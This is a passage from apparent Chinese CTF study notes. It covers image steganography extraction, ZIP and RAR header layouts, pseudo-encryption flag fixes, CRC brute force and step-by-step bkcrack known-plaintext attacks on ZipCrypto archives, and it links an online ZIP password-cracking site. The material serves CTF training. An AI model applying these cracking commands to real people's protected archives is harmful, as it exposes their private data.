class="number">0x12</span>+<span class="number">4</span>],</span><br><span class="line">              byteorder=<span class="string">&quot;little&quot;</span>, signed=<span class="literal">True</span>))</span><br><span class="line">    row = <span class="built_in">abs</span>(<span class="built_in">int</span>.from_bytes(data[<span class="number">0x16</span>:<span class="number">0x16</span>+<span class="number">4</span>],</span><br><span class="line">              byteorder=<span class="string">&quot;little&quot;</span>, signed=<span class="literal">True</span>))</span><br><span class="line">    pixels_size = get_pixels_size(data)</span><br><span class="line"></span><br><span class="line">    width, height = pixels_size // row, pixels_size // col</span><br><span class="line">    sqrt_num = <span class="built_in">int</span>(math.sqrt((pixels_size)))</span><br><span class="line">    save_img(data, width=width, height=height, sqrt_num=sqrt_num)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;温馨提示：由于填充字节的问题，所以可能会偏差几个像素!&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;1.修复宽度: <span class="subst">&#123;width&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;2.修复高度: <span class="subst">&#123;height&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;3.修复宽度高度为: <span class="subst">&#123;sqrt_num&#125;</span>&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h4 id="wbStego4open隐写">wbStego4open隐写</h4>
<p>用wbStego4open直接decode</p>
<h3 id="GIF隐写">GIF隐写</h3>
<p>分帧提取 在线网站：<a class="link"   target="_blank" rel="noopener" href="https://tool.lu/gifsplitter/" >https://tool.lu/gifsplitter/<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在Windows或者WSL中执行以下命令进行分离</span></span><br><span class="line">ffmpeg -i filename.gif frame%04d.png</span><br></pre></td></tr></table></figure>
<h3 id="二维码隐写">二维码隐写</h3>
<ul>
<li>
<p>bmp转二维码</p>
</li>
<li>
<p>16进制转pyc</p>
</li>
<li>
<p>字符串制作二维码</p>
<p>直接右键使用B神的脚本制作二维码，制作前注意要把字符串的长度手动修正为平方数<br>
1.0 1制作二维码<br>
2.00 11制作二维码</p>
</li>
<li>
<p>四个TTL值转换一个字节的二进制数</p>
</li>
<li>
<p>Aztec code、DataMatrix、GridMatrix、汉信码、PDF417code等</p>
</li>
</ul>
<h3 id="Webp隐写">Webp隐写</h3>
<p>webp文件用电脑自带的图片看可能会有点问题，建议用浏览器打开这种文件</p>
<p>webp可能是动图，可以用下面这个脚本分离webp中的每帧图片</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;killer.webp&#x27;</span>)</span><br><span class="line">n_frame = img.n_frames</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n_frame):</span><br><span class="line">    img.seek(i)</span><br><span class="line">    img.save(<span class="string">f&#x27;img/<span class="subst">&#123;i&#125;</span>.png&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="RAW、ARW文件隐写">RAW、ARW文件隐写</h3>
<ul>
<li>
<h4 id="RAW的LSB隐写">RAW的LSB隐写</h4>
</li>
</ul>
<p>ARW文件是 Sony 相机的原始数据格式</p>
<p>可以使用 rawpy 模块读取图片的像素数据，查看是否存在LSB隐写【例：2024 L3HCTF RAWatermark】</p>
<p>示例脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> rawpy</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> rawpy.imread(<span class="string">&#x27;image.ARW&#x27;</span>) <span class="keyword">as</span> raw:</span><br><span class="line">    <span class="comment"># 从 raw 对象中获取可见的 Bayer 格式图像数据</span></span><br><span class="line">    bayer_visible = raw.raw_image_visible</span><br><span class="line">    <span class="comment"># print(bayer_visible)</span></span><br><span class="line">    <span class="comment"># 用 bitwise_and() 函数将 bayer_visible 中的每个像素值与 1 进行按位与操作，以提取每个像素的最低有效位（LSB）</span></span><br><span class="line">    lsb_array = np.bitwise_and(bayer_visible, <span class="number">1</span>)</span><br><span class="line">    <span class="comment"># print(lsb_array)</span></span><br><span class="line">    <span class="comment"># 使用 NumPy 数组的 flatten() 方法将 lsb_array 数组展平成一维数组</span></span><br><span class="line">    lsb_array_flat = lsb_array.flatten()</span><br><span class="line">    <span class="comment"># print(lsb_array_flat)</span></span><br><span class="line">    hidden_message = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, lsb_array_flat))</span><br><span class="line">    <span class="comment"># 将隐写的数据转为十六进制，便于查看文件头</span></span><br><span class="line">    hex_data = <span class="built_in">hex</span>(<span class="built_in">int</span>(hidden_message, <span class="number">2</span>))</span><br><span class="line">    <span class="comment"># print(hex_data[:10]) # 0x504b0304</span></span><br><span class="line">    <span class="comment"># 将二进制数据转换为byte类型数据</span></span><br><span class="line">    data = libnum.b2s(hidden_message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.zip&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(data)</span><br></pre></td></tr></table></figure>
<ul>
<li>
<h4 id="直接改后缀为-data，然后拖入Gimp即可">直接改后缀为.data，然后拖入Gimp即可</h4>
</li>
</ul>
<h3 id="压缩包">压缩包</h3>
<p><a class="link"   target="_blank" rel="noopener" href="https://passwordrecovery.io/zip-file-password-removal/" >压缩包密码在线破解网站<i class="fas fa-external-link-alt"></i></a></p>
<p>Tips：压缩包的密码可以是中英文字符和符号<br>
​没有思路时可以直接纯数字/字母暴力爆破一下</p>
<h4 id="zip文件结构">zip文件结构</h4>
<p>三部分：压缩文件源数据区 + 压缩源文件目录区 + 压缩源文件目录结束标志</p>
<p><strong>文件源数据区</strong></p>
<table>
<thead>
<tr>
<th style="text-align:left">HEX 数据</th>
<th style="text-align:left">描述</th>
<th style="text-align:left">010Editor 模板数据</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">50 4B 03 04</td>
<td style="text-align:left">zip 文件头标记，看文本的话就是 PK 开头</td>
<td style="text-align:left">char frSignature[4]</td>
</tr>
<tr>
<td style="text-align:left">0A 00</td>
<td style="text-align:left">解压文件所需 pkware 版本</td>
<td style="text-align:left">ushort frVersion</td>
</tr>
<tr>
<td style="text-align:left">00 00</td>
<td style="text-align:left">全局方式位标记（有无加密），头文件标记后 2bytes</td>
<td style="text-align:left">ushort frFlags</td>
</tr>
<tr>
<td style="text-align:left">00 00</td>
<td style="text-align:left">压缩方式</td>
<td style="text-align:left">enum COMPTYPE frCompression</td>
</tr>
<tr>
<td style="text-align:left">E8 A6</td>
<td style="text-align:left">最后修改文件时间</td>
<td style="text-align:left">DOSTIME frFileTime</td>
</tr>
<tr>
<td style="text-align:left">32 53</td>
<td style="text-align:left">最后修改文件日期</td>
<td style="text-align:left">DOSDATE frFileDate</td>
</tr>
<tr>
<td style="text-align:left">0C 7E 7F D8</td>
<td style="text-align:left">CRC-32 校验</td>
<td style="text-align:left">uint frCrc</td>
</tr>
</tbody>
</table>
<p><strong>文件目录区</strong></p>
<table>
<thead>
<tr>
<th>HEX 数据</th>
<th>描述</th>
<th>010Editor 模板数据</th>
</tr>
</thead>
<tbody>
<tr>
<td>50 4B 01 02</td>
<td>目录中文件文件头标记</td>
<td>char deSignature[4]</td>
</tr>
<tr>
<td>3F 00</td>
<td>压缩使用的 pkware 版本</td>
<td>ushort deVersionMadeBy</td>
</tr>
<tr>
<td>0A 00</td>
<td>解压文件所需 pkware 版本</td>
<td>ushort deVersionToExtract</td>
</tr>
<tr>
<td>00 00</td>
<td>全局方式位标记（有无加密），目录文件标记后 4bytes</td>
<td>ushort frFlags</td>
</tr>
<tr>
<td>00 00</td>
<td>压缩方式</td>
<td>enum COMPTYPE frCompression</td>
</tr>
<tr>
<td>E8 A6</td>
<td>最后修改文件时间</td>
<td>DOSTIME frFileTime</td>
</tr>
<tr>
<td>32 53</td>
<td>最后修改文件日期</td>
<td>DOSDATE frFileDate</td>
</tr>
<tr>
<td>0C 7E 7F D8</td>
<td>CRC-32 校验</td>
<td>uint frCrc</td>
</tr>
</tbody>
</table>
<p><strong>文件目录结束</strong></p>
<table>
<thead>
<tr>
<th>50 4B 05 06</th>
<th>目录结束标记</th>
<th>char elSignature[4]</th>
</tr>
</thead>
<tbody>
<tr>
<td>00 00</td>
<td>当前磁盘编号</td>
<td>ushort elDiskNumber</td>
</tr>
<tr>
<td>00 00</td>
<td>目录区开始磁盘编号</td>
<td>ushort elStartDiskNumber</td>
</tr>
</tbody>
</table>
<h4 id="rar文件结构">rar文件结构</h4>
<table>
<thead>
<tr>
<th>HEX 数据</th>
<th>描述</th>
<th>010Editor 模板数据</th>
</tr>
</thead>
<tbody>
<tr>
<td>52 61 72 21 1A 07 00</td>
<td>rar 文件头标记，文本为 Rar!</td>
<td></td>
</tr>
</tbody>
</table>
<p><strong>Main block</strong></p>
<table>
<thead>
<tr>
<th>HEX 数据</th>
<th>描述</th>
<th>010Editor 模板数据</th>
</tr>
</thead>
<tbody>
<tr>
<td>33 92 B5 E5</td>
<td>全部块的 CRC32 值</td>
<td>uint32 HEAD_CRC</td>
</tr>
<tr>
<td>0A</td>
<td>块大小</td>
<td>struct uleb128 HeadSize</td>
</tr>
<tr>
<td>01</td>
<td>块类型</td>
<td>struct uleb128 HeadType</td>
</tr>
<tr>
<td>05</td>
<td>阻止标志</td>
<td>struct uleb128 HeadFlag</td>
</tr>
</tbody>
</table>
<p><strong>File Header</strong></p>
<table>
<thead>
<tr>
<th>HEX 数据</th>
<th>描述</th>
<th>010Editor 模板数据</th>
</tr>
</thead>
<tbody>
<tr>
<td>43 06 35 17</td>
<td>单独块的 CRC32 值</td>
<td>uint32 HEAD_CRC</td>
</tr>
<tr>
<td>55</td>
<td>块大小</td>
<td>struct uleb128 HeadSize</td>
</tr>
<tr>
<td>02</td>
<td>块类型</td>
<td>struct uleb128 HeadType</td>
</tr>
<tr>
<td>03</td>
<td>阻止标志</td>
<td>struct uleb128 HeadFlag</td>
</tr>
</tbody>
</table>
<p><strong>Terminator</strong></p>
<table>
<thead>
<tr>
<th>HEX 数据</th>
<th>描述</th>
<th>010Editor 模板数据</th>
</tr>
</thead>
<tbody>
<tr>
<td>1D 77 56 51</td>
<td>固定的 CRC32 值</td>
<td>uint32 HEAD_CRC</td>
</tr>
<tr>
<td>03</td>
<td>块大小</td>
<td>struct uleb128 HeadSize</td>
</tr>
<tr>
<td>05</td>
<td>块类型</td>
<td>struct uleb128 HeadType</td>
</tr>
<tr>
<td>04 00</td>
<td>阻止标志</td>
<td>struct uleb128 HeadFlag</td>
</tr>
</tbody>
</table>
<h4 id="压缩包伪加密">压缩包伪加密</h4>
<h5 id="zip文件：">zip文件：</h5>
<p>可以直接用ZipCenOp.jar修复：</p>
<p>java -jar ZipCenOp.jar r screct.zip</p>
<p>WinRAR打开、010改标志位、binwalk直接分离</p>
<p>如果压缩文件已损坏，则尝试用winrar打开，工具-修复压缩包</p>
<p>压缩源文件数据区：7-8位表示有无加密</p>
<p>压缩源文件目录区：9-10位表示是否是伪加密</p>
<p>一般这俩地方都是09 00的，大概率就是伪加密了(直接把第二个PK后的09改了就行)</p>
<p>奇数为加密，偶数为不加密，frflag位</p>
<p>frFlags 用于告知压缩软件这个压缩包的一些信息，奇数（最低位为1）告诉压缩软件这个压缩包是被加密的。没有一个标志可以判断是否是伪加密，因为生活实际中根本就没有这样的需求。我们只能猜测这个 CTF 题目中，通过修改 frFlags，将未加密压缩包标记成了已加密。</p>
<p>7zip判断是否为加密是看record区的frflag位，bandzip和winrar判断是否为加密是看是看direntry区的deflag位，所以在出题的时候需要把两个位置同时修改。</p>
<h5 id="rar文件：">rar文件：</h5>
<p>第24个字节尾数为4表示加密，0表示无加密，将尾数改为0即可破解伪加密</p>
<h4 id="CRC爆破（压缩包中文件比较小的时候）">CRC爆破（压缩包中文件比较小的时候）</h4>
<p>使用CRC爆破需要文件大小小于等于18个字节</p>
<p>参考文章：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/110206427" >https://blog.csdn.net/mochu7777777/article/details/110206427<i class="fas fa-external-link-alt"></i></a></p>
<p>可以使用CTFD中的两种脚本爆破一下(速度不同)</p>
<h4 id="明文攻击">明文攻击</h4>
<h5 id="已知所有的明文或三段密钥"><strong>已知所有的明文或三段密钥</strong></h5>
<p><strong>使用Advanced Archive Password Recovery破解</strong></p>
<p>有和压缩包中的一样(CRC值一样)的文件时，压缩然后用AAPR进行明文攻击,这个攻击的过程可能需要几分钟</p>
<p>有了完整的三段密钥也可以使用这个工具破解密码</p>
<p><strong>使用bkcrack破解</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将bkcrack作为系统命令使用</span></span><br><span class="line"><span class="built_in">cp</span> bkcrack /usr/sbin/bkcrack</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">命令的格式为：bkcrack -C 加密的压缩包 -c 存在明文的文件 -p 存储了明文的文本</span><br><span class="line">-C: 加密的需要破解的压缩包</span><br><span class="line">-c: 被加密压缩包内明文文件的名称</span><br><span class="line">-p: 已有的 在被加密压缩包外的明文文本的名称</span><br></pre></td></tr></table></figure>
<h5 id="已知部分明文">已知部分明文</h5>
<p><strong>利用bkcrack进行攻击</strong></p>
<p>参考资料</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/articles/network/255145.html</span><br><span class="line">https://byxs20.github.io/posts/30731.html#%E6%80%BB%E7%BB%93</span><br></pre></td></tr></table></figure>
<p>该利用方法的具体要求如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">至少已知明文的12个字节及偏移，其中至少8字节需要连续。</span><br><span class="line">明文对应的文件加密方式为ZipCrypto Store</span><br><span class="line">Tips：进行明文攻击前要判断制作压缩包的压缩工具，然后对已知明文使用特定工具进行压缩，再进行明文攻击</span><br><span class="line">例子：bkcrack -C \$R9EG7XR.zip -c flag.txt -k 958597ea b9f7740b 622aed5e -d flag.txt</span><br></pre></td></tr></table></figure>
<p>如何判断压缩工具（参考自B神的博客）</p>
<table>
<thead>
<tr>
<th>压缩攻击</th>
<th>VersionMadeBy(压缩所用版本)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Bandzip 7.06</td>
<td>20</td>
</tr>
<tr>
<td>Windows自带</td>
<td>20</td>
</tr>
<tr>
<td>WinRAR 4.20</td>
<td>31</td>
</tr>
<tr>
<td>WinRAR 5.70</td>
<td>31</td>
</tr>
<tr>
<td>7-Zip</td>
<td>63</td>
</tr>
</tbody>
</table>
<p><strong>bkcrack常用参数</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-c 要解密的文件</span><br><span class="line">-P 已知明文所在的压缩包</span><br><span class="line">-p 已知的明文部分</span><br><span class="line">-x 压缩包内目标文件的偏移地址  部分已知明文值</span><br><span class="line">-C 加密压缩包</span><br><span class="line">-o offset  -p参数指定的明文在压缩包内目标文件的偏移量</span><br><span class="line">-k 后面加破解出的三段密钥</span><br><span class="line">-d 后面加解密后数据的保存位置</span><br><span class="line">-U 修改压缩包密码并导出	bkcrack -C flag.zip -c hint.jpg -k afb9fee3 f8795353 f6de1d4e -U out.zip 114514</span><br></pre></td></tr></table></figure>
<p>例题：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Tips:</span></span><br><span class="line">xxd // xxd 命令用于用二进制或十六进制显示文件的内容</span><br><span class="line">-r // 把xxd的十六进制输出内容转换回原文件的二进制内容</span><br><span class="line">-ps // 以 postscript的连续十六进制转储输出，这也叫做纯十六进制转储</span><br></pre></td></tr></table></figure>
<h5 id="1-简单的加密文本压缩包破解">1)简单的加密文本压缩包破解</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;16e371fa-0555-47fc-b343-74f6754f6c01&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#攻击步骤如下：</span></span><br><span class="line"><span class="comment">#准备已知明文</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;lag&#123;16e3&quot;</span> &gt; plain1.txt   <span class="comment">#连续的8明文</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;74f6&quot;</span> | xxd             <span class="comment">#额外明文的十六进制格式，37346636</span></span><br><span class="line"><span class="comment">#攻击，-o是偏移量</span></span><br><span class="line">bkcrack -C flag_360.zip -c flag.txt -p plain1.txt -o 1 -x 29 37346636</span><br><span class="line"><span class="comment">#由于时间较长，为防止终端终端导致破解中断，可以加点小技巧</span></span><br><span class="line">bkcrack -C flag_360.zip -c flag.txt -p plain1.txt -o 1 -x 29 37346636 &gt; 1.<span class="built_in">log</span>&amp; </span><br><span class="line"><span class="comment">#后台运行，结果存入1.log</span></span><br><span class="line"><span class="comment">#加上time参数方便计算爆破时间</span></span><br><span class="line">time bkcrack -C flag_360.zip -c flag.txt -p plain1.txt -o 1 -x 29 37346636 &gt; 1.<span class="built_in">log</span>&amp;</span><br><span class="line"><span class="comment">#查看爆破进度</span></span><br><span class="line"><span class="built_in">tail</span> -f 1.<span class="built_in">log</span></span><br><span class="line"><span class="comment">#使用该秘钥进行解密：</span></span><br><span class="line">bkcrack -C flag_360.zip -c flag.txt  -k b21e5df4 ab9a9430 8c336475 -d flag.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-p 指定的明文不需要转换，-x 指定的明文需要转成十六进制</span></span><br><span class="line"><span class="comment">#提到的偏移都是指 “已知明文在加密前文件中的偏移”。</span></span><br></pre></td></tr></table></figure>
<h5 id="2-利用PNG图片文件头破解">2)利用PNG图片文件头破解</h5>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#准备已知明文</span></span><br><span class="line"><span class="built_in">echo</span> 89504E470D0A1A0A0000000D49484452 | xxd -r -ps &gt; png_header</span><br><span class="line"><span class="comment">#攻击</span></span><br><span class="line">time bkcrack -C png4.zip -c 2.png -p png_header -o 0 &gt;1.<span class="built_in">log</span>&amp;</span><br><span class="line"><span class="built_in">tail</span> -f 1.<span class="built_in">log</span></span><br><span class="line">time bkcrack -C png4.zip -c flag.txt -k e0be8d5d 70bb3140 7e983fff -d flag.txt</span><br></pre></td></tr></table></figure>
<h5 id="3-利用压缩包格式破解">3)利用压缩包格式破解</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">将一个名为flag.txt的文件打包成ZIP压缩包后，发现文件名称会出现在压缩包文件头中，且偏移固定为30。且默认情况下，flag.zip也会作为该压缩包的名称。</span><br><span class="line">已知的明文片段有：</span><br><span class="line">“flag.txt”  8个字节，偏移30</span><br><span class="line">ZIP本身文件头：50 4B 03 04 ，4字节</span><br><span class="line">满足12字节的要求</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;flag.txt&quot;</span> &gt; plain1.txt <span class="comment">#-n参数避免换行，不然文件中会出现换行符，导致攻击失效</span></span><br><span class="line">time bkcrack -C test5.zip -c flag.zip -p plain1.txt -o 30  -x 0 504B0304 &gt;1.<span class="built_in">log</span>&amp;</span><br><span class="line"><span class="built_in">tail</span> -f 1.<span class="built_in">log</span></span><br><span class="line">bkcrack -C test5.zip -c flag.zip -k b21e5df4 ab9a9430 8c336475  -d flag.zip</span><br><span class="line"><span class="comment">#但若想解密2.png，由于是ZipCrypto deflate加密的</span></span><br><span class="line"><span class="comment">#使用deflate算法压缩的文件，解码出来的是Deflate的数据流</span></span><br><span class="line"><span class="comment">#所以解密后需要bkcrack/tool内的inflate.py脚本再次处理</span></span><br><span class="line">bkcrack -C test5.zip -c 2.png -k b21e5df4 ab9a9430 8c336475  -d 2.png</span><br><span class="line">python3 inflate.py &lt; 2.png &gt; 2_out.png</span><br></pre></td></tr></table></figure>
<p>Tips：如果这里用&quot;XXXXX.txt&quot;作为plaint1.txt无法破解出密钥，可以试试直接去掉后缀再作为plaint1.txt</p>
<p>例如：NKCTF2023——五年Misc，三年模拟</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#echo -n &quot;handsome.txt&quot; &gt; plain1.txt 破解失败</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;handsome&quot;</span> &gt; plain1.txt</span><br><span class="line">time bkcrack -C test5.zip -c handsome.zip -p plain1.txt -o 30  -x 0 504B0304 &gt;1.<span class="built_in">log</span>&amp;</span><br></pre></td></tr></table></figure>
<h5 id="4-EXE文件格式破解">4)EXE文件格式破解</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXE文件默认加密情况下，不太会以store方式被加密，但它文件格式中的的明文及其明显，长度足够。如果加密ZIP压缩包出现以store算法存储的EXE格式文件，很容易进行破解。</span><br><span class="line">大部分exe中都有这相同一段，且偏移固定为64：</span><br></pre></td></tr></table></figure>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://image.3001.net/images/20201117/1605593956_5fb36b64db62588f96dcc.png!small"
                        alt="img"
                 ></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;0E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000&quot;</span> | xxd -r -ps &gt; mingwen</span><br><span class="line">time bkcrack -C nc64.zip -c nc64.exe -p mingwen -o64  &gt;1.<span class="built_in">log</span>&amp;</span><br><span class="line"><span class="built_in">tail</span> -f 1.<span class="built_in">log</span></span><br><span class="line">bkcrack -C nc64.zip -c nc64.exe -k b21e5df4 ab9a9430 8c336475  -d nc64.exe</span><br></pre></td></tr></table></figure>
<h5 id="5-流量包pcapng格式解密">5)流量包pcapng格式解密</h5>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;00004D3C2B1A01000000FFFFFFFFFFFFFFFF&quot;</span> | xxd -r -ps &gt; pcap_plain1</span><br><span class="line">time bkcrack -C 3.zip -c capture.pcapng -p pcap_plain1 -o 6</span><br><span class="line">bkcrack -C 3.zip -c capture.pcapng  -k e33a580c  c0c96a81 1246d892  -d out.pcapng</span><br></pre></td></tr></table></figure>
<h5 id="6-网站相关文件破解">6)网站相关文件破解</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">robots.txt的文件开头内容通常是User-agent: * </span><br><span class="line">html文件开头通常是 &lt;!DOCTYPE html&gt;</span><br><span class="line">xml文件开头通常是&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#x27;</span> &gt; xml_plain</span><br><span class="line">time bkcrack -C xml.zip -c 123/web.xml -p xml_plain -o 0  //注意相对路径</span><br><span class="line">bkcrack -C xml.zip -c 123/web.xml  -k e0be8d5d 70bb3140 7e983fff  -d web.xml</span><br></pre></td></tr></table></figure>
<h5 id="7-SVG文件格式破解">7)SVG文件格式破解</h5>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#SVG是一种基于XML的图像文件格式</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; &#x27;</span> &gt; plain.txt</span><br><span class="line">bkcrack -C secrets.zip -c spiral.svg -p plain.txt -o 0</span><br><span class="line"><span class="comment">#解密 Store算法  直接解密即可</span></span><br><span class="line">bkcrack -C secrets.zip -c spiral.svg -k c4038591 d5ff449d d3b0c696 -d spiral_deciphered.svg</span><br><span class="line"><span class="comment">#解密 deflate算法</span></span><br><span class="line">bkcrack -C secrets.zip -c advice.jpg -k c4038591 d5ff449d d3b0c696 -d out.jpg</span><br><span class="line"><span class="comment">#该文件使用了deflate算法压缩的，解码出来的是Deflate的数据流,因此须将其解压缩。</span></span><br><span class="line">python3 inflate.py &lt; out.jpge &gt; flag.jpg</span><br></pre></td></tr></table></figure>
<h5 id="8-VMDK文件格式破解">8)VMDK文件格式破解</h5>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;4B444D560100000003000000&quot;</span> | xxd -r -ps &gt; plain2</span><br><span class="line">time bkcrack -C Easy_VMDK.zip -c flag.vmdk -p plain2 -o 0</span><br><span class="line">time bkcrack -C Easy_VMDK.zip -c flag.vmdk -k xxx xxx xxx -d flag.vmdk</span><br></pre></td></tr></table></figure>
<p><strong>有时候直接给你部分明文的情况（2023 DASCTFxCBCTF）</strong></p>
<p>直接在bkcrack中使用以下命令即可，key是题目给的压缩包中被压缩文件的部分明文</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -C purezip.zip -c <span class="string">&#x27;secret key.zip&#x27;</span> -p key</span><br></pre></td></tr></table></figure>
<p><strong>直接给了加密压缩包中部分文件的情况</strong></p>
<p>例题1 - 2023 古剑山-幸运饼干</p>
<ul>
<li>
<p>可以先把该文件用压缩软件压缩成一个压缩包，然后用 Advanced Archive Password Recovery 明文攻击试试看</p>
</li>
<li>
<p>用压缩软件把该文件压缩成一个压缩包，然后使用 bkcrack 进行明文攻击</p>
<p>为什么需要压缩成压缩包呢？因为如果不带上压缩包进行明文攻击的话会报下面这个错误</p>
